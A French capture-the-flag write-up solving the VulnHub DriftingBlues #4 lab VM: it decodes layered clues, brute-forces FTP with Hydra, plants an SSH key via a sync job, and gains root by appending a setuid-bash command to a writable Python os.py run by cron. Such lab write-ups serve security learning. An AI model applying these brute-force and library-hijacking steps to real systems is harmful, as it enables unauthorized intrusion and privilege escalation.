# Solution du CTF DriftingBlues #4 de VulnHub

Quatrième Dimension
-------------------

[Ce CTF](https://www.vulnhub.com/entry/driftingblues-4,661/), 4ème du nom est un boot2root décrit comme facile. Il a été créé par [tasiyanci](https://twitter.com/tasiyanci).  

```plain
Nmap scan report for 192.168.56.9 
Host is up (0.00028s latency). 
Not shown: 65532 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
21/tcp open  ftp     ProFTPD 
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 
| ssh-hostkey:  
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA) 
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA) 
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519) 
80/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
|_http-title: Site doesn't have a title (text/html). 
|_http-server-header: Apache/2.4.38 (Debian)
```

Le serveur ProFTPD ne fournit pas sa version et ne supporte pas les connexions anonymes. On verra si on peut l'utiliser plus tard.  

Sur la page web on peut lire *Under Construction, please stand by* mais en commentaire dans la source HTML se trouve un base 64. Le résultat contient lui même du base64. Pour réduire je met les différents résultats obtenus :  

```plain
go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==

tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=

i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=

/imfuckingmad.txt
```

Le dernier path correspond à un fichier sur le serveur web qui semble contenir du code [BrainFuck](https://en.wikipedia.org/wiki/Brainfuck). Une nouvelle fois [dcode.fr](https://www.dcode.fr/brainfuck-language) dispose d'un interpréteur. L'output obtenu est le suivant :  

```plain
man we are a tech company and still getting hacked??? what the shit??? enough is enough!!! 
#
##
--- snip ---
##
#

/iTiS3Cr3TbiTCh.png
```

Ce path correspond à une image d'un code QR. J'ai trouvé [ce décodeur en ligne](https://blog.qr4.nl/Online-QR-Code-Decoder.aspx) qui m'a craché le texte <https://i.imgur.com/a4JjS76.png>.  

Passons sur le caractère risqué de laisser une partie d'un CTF aux mains d'un site dont la survie n'est pas assurée... L'image contient le texte suivant :  

```plain
drifting blues tech confidental

dear:

luther
******
gary
hubert
clark
******

please fix our website soon
```

Gimme a S, Gimme a H,...
------------------------

Armé de ces noms d'utilisateurs on se dit qu'on pourrait bruteforcer le service SSH, mais non d'après Hydra :  

```plain
[ERROR] target ssh://192.168.56.9:22/ does not support password authentication (method reply 4)
```

C'est là que FTP entre en jeu. Je récupère la [probable wordlist](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords) *Top12Thousand-probable-v2.txt* et je l'utilise comme candidats de passwords pour THC-Hydra (il faut compter une bonne demi heure) :  

```plain
$ hydra -L users.txt -P Top12Thousand-probable-v2.txt ftp://192.168.56.9
--- snip ---
[21][ftp] host: 192.168.56.9   login: hubert   password: john316 
1 of 1 target successfully completed, 1 valid password found
```

Gotcha ! Une fois connecté sur le FTP je remarque un dossier *hubert* vide ainsi qu'un fichier *sync\_log* dont voici le contenu :  

```plain
sync completed at Thu 20 Jan 2022 07:06:01 AM CST
```

Si on attend un peu on remarque que la date indiquée est mise à jour.  

Le message indique qu'une synchronisation a lieu et comme le dossier correspond au nom d'utilisateur on peut imaginer que les fichiers que l'on pose seront copiés sous */home/hubert*.  

Ni une ni deux je crée un dossier .ssh puis je copie ma clé publique SSH sous le nom *authorized\_keys*. Ça fonctionne !  

```plain
$ ssh hubert@192.168.56.9 
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 

The programs included with the Debian GNU/Linux system are free software; 
the exact distribution terms for each program are described in the 
individual files in /usr/share/doc/*/copyright. 

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
hubert@driftingblues:~$ cat user.txt  
flag 1/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

```

This is not a test of the emergency broadcast system, this is a real thing!
---------------------------------------------------------------------------

Dans le dossier de l'utilisateur se trouve un fichier Python :  

```plain
-rwxr-xr-x 1 root root 217 Jan  9  2021 emergency.py
```

Son contenu :  

```python
#!/usr/bin/python 

import os 

os.system('echo 1 >> /tmp/backdoor_testing') 

# template python script for backdoor purposes 
# i'm gonna leave it with loose permissions 
#  
--- snip ---
# 
# say africa without a's
```

Il y a bien un fichier */tmp/backdoor\_testing* appartenant à root et son timestamp change régulièrement, preuve qu'une tache planifiée exécute le script Python.  

Pour que l'exploitation fonctionne il faudrait pouvoir modifier le module *os* de Python et ça tombe bien :  

```plain
hubert@driftingblues:~$ find /usr/ -writable 2> /dev/null  
/usr/lib/python2.7/os.py
```

J'ai seulement ajouté cette ligne à la fin du fichier :  

```python
system("cp /bin/bash /tmp/g0tr00t; chmod 4755 /tmp/g0tr00t")
```

Ça fait le job :  

```plain
hubert@driftingblues:~$ /tmp/g0tr00t -p 
g0tr00t-5.0# cd /root 
g0tr00t-5.0# cat root.txt  
flag 2/2 
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄ 
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄ 
░░░░█░░░░░░░░░░░░░░░░░░░░░░█ 
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█ 
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█ 
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█ 
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█ 
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█ 
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█ 
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█ 
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█ 
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█ 
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█ 
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█ 
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█ 
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀ 
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄ 
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█ 
░░█░░▌░█░░█░░█░░░█░░█░░█ 
░░█░░▀▀░░██░░█░░░█░░█░░█ 
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█ 

congratulations!
```

Sous le capot
-------------

```plain
g0tr00t-5.0# tail -3 /var/spool/cron/crontabs/root
SHELL=/bin/bash
* * * * * bash /root/sync
* * * * * python /home/hubert/emergency.py
g0tr00t-5.0# cat /root/sync
#!/bin/bash

omega=$(date)
#sleep 69
rm -rf /home/*/.local /home/*/.bashrc /home/*/.bash_history /home/*/.profie
cp -R /var/driftingblues_ftp/hubert /home/
echo "" > /home/hubert/.bash_history
echo "" > /home/hubert/.bashrc
chmod -R 700 /home/hubert
chown -R hubert:hubert /home/hubert
chown root:root /home/hubert/emergency.py
chmod 755 /home/hubert/emergency.py
echo "sync completed at $omega" > /var/driftingblues_ftp/sync_log
exit
```

That's it!

*Published January 20 2022 at 18:10*